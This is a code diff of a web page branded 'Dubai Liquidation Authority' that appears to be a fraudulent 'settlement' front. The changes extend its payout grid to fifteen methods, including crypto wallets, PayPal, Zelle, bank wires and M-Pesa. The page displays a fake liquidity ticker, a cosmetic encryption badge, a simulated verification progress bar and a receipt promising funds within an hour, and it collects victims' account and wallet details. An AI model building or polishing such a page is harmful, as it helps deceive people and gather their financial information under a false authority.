@@ -20,14 +20,16 @@
         .tag { font-size: 10px; color: var(--gold); font-weight: bold; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
         label { font-size: 11px; color: #888; display: block; margin-top: 18px; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
         input, select { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border); color: var(--text); border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: #0a0c10; }
-        .pay { border: 1px solid #333; padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: #ccc; border-radius: 10px; background: #111; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+        
+        /* The Payment Grid with Scrolling */
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 250px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: #0a0c10; scrollbar-width: thin; scrollbar-color: var(--gold) #111; }
+        .pay { border: 1px solid #333; padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: #ccc; border-radius: 10px; background: #111; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
         .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); color: #fff; }
+
         .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; }
         .res-box b { font-size: 34px; color: #fff; display: block; }
         #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
         
-        /* Node Sponsors Styles */
         .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
         .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
         .node-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 0 10px; }
@@ -47,14 +49,13 @@
         
         .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; text-decoration: none; color: #fff; z-index: 3000; display: flex; align-items: center; gap: 10px; }
         .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
 
-    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
+    <button class="theme-toggle" onclick="toggleTheme()">☀️ LIGHT</button>
 
-    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
+    <div class="ticker-wrap"><div class="ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
 
     <div class="panel">
         <div id="form-container">
@@ -82,15 +83,23 @@
                 <div id="local-payout"></div>
             </div>
 
-            <label>Global Payout Gateway</label>
+            <label>Global Payout Gateway (15 Methods)</label>
             <div class="grid">
                 <div class="pay" onclick="sel(this, '💎 USDT', 'Enter TRC20 Wallet', 1, 'USDT')"><span>💎</span>USDT</div>
                 <div class="pay" onclick="sel(this, '🔵 PayPal', 'Enter Email Address', 1, 'USD')"><span>🔵</span>PayPal</div>
                 <div class="pay" onclick="sel(this, '🇳🇬 Bank', 'Acct No + Bank', 1610, 'NGN')"><span>🇳🇬</span>Bank NG</div>
                 <div class="pay" onclick="sel(this, '🌀 Zelle', 'Enter Email/Phone', 1, 'USD')"><span>🌀</span>Zelle</div>
                 <div class="pay" onclick="sel(this, '💸 CashApp', 'Enter $Cashtag', 1, 'USD')"><span>💸</span>CashApp</div>
+                <div class="pay" onclick="sel(this, '🟡 Binance', 'Enter Binance ID', 1, 'USD')"><span>🟡</span>Binance Pay</div>
                 <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 'Enter Phone Number', 131.50, 'KES')"><span>🇰🇪</span>M-Pesa</div>
+                <div class="pay" onclick="sel(this, '💳 Revolut', 'Enter RevTag', 1, 'USD')"><span>💳</span>Revolut</div>
                 <div class="pay" onclick="sel(this, '🇬🇭 Momo', 'Enter GH Phone', 14.80, 'GHS')"><span>🇬🇭</span>MoMo GH</div>
+                <div class="pay" onclick="sel(this, '🍎 Apple Pay', 'Enter Apple Email', 1, 'USD')"><span>🍎</span>Apple Pay</div>
+                <div class="pay" onclick="sel(this, '🇿🇦 Bank', 'Acct + Branch', 18.50, 'ZAR')"><span>🇿🇦</span>Bank ZA</div>
+                <div class="pay" onclick="sel(this, '🟠 Skrill', 'Enter Email', 1, 'USD')"><span>🟠</span>Skrill</div>
+                <div class="pay" onclick="sel(this, '🟣 Venmo', 'Enter Username', 1, 'USD')"><span>🟣</span>Venmo</div>
+                <div class="pay" onclick="sel(this, '💰 Bitcoin', 'Enter BTC Address', 1, 'BTC')"><span>💰</span>Bitcoin</div>
+                <div class="pay" onclick="sel(this, '🏦 Wire', 'Enter IBAN/Swift', 1, 'USD')"><span>🏦</span>Bank Wire</div>
             </div>
 
             <label id="payout-label">Payout Details</label>
@@ -100,8 +109,7 @@
             <input id="email" type="email" placeholder="Required for receipt">
 
             <button class="main-btn" onclick="submitNow()">Authorize Settlement</button>
-            
-            <div class="secure-badge"><span style="color:#4ade80;">🛡️</span> SSL 256-BIT ENCRYPTION SECURE</div>
+            <div class="secure-badge"><span>🛡️</span> SSL 256-BIT ENCRYPTION SECURE</div>
 
             <div class="node-footer">
                 <p>Authorized Settlement Nodes</p>
@@ -125,14 +133,14 @@
         </div>
 
         <div id="success">
-            <div class="receipt-container" id="receipt-content">
-                <h1 style="font-size:20px; margin:0;">CERTIFICATE OF SETTLEMENT</h1>
+            <div class="receipt-container">
+                <h1 style="font-size:18px; margin:0;">SETTLEMENT VERIFIED</h1>
                 <p style="font-size:10px; color:#d4af37;">Dubai Liquidation Authority</p>
                 <hr>
-                <p style="font-size:12px;"><b>Transaction ID:</b> <span id="r-tid"></span></p>
+                <p style="font-size:12px;"><b>ID:</b> <span id="r-tid"></span></p>
                 <div class="hero-usd" id="r-price">$0.00</div>
-                <p style="font-size:12px; color:green;"><b>STATUS: PENDING VERIFICATION</b></p>
-                <p style="font-size:10px;">Funds will arrive in 1 hour.</p>
+                <p style="color:green; font-weight:900;">STATUS: PENDING</p>
+                <p style="font-size:10px;">Funds expected in 1 hour.</p>
             </div>
             <button class="main-btn" onclick="location.reload()">New Transaction</button>
         </div>
@@ -196,7 +204,7 @@
                     if(p==33) document.getElementById('s1').style.color='#4ade80';
                     if(p==66) document.getElementById('s2').style.color='#4ade80';
                     if(p>=100) { clearInterval(iv); showReceipt(totalUSD); }
-                }, 40);
+                }, 30);
             })
             .catch(err => alert("Error: " + err.message));
         }
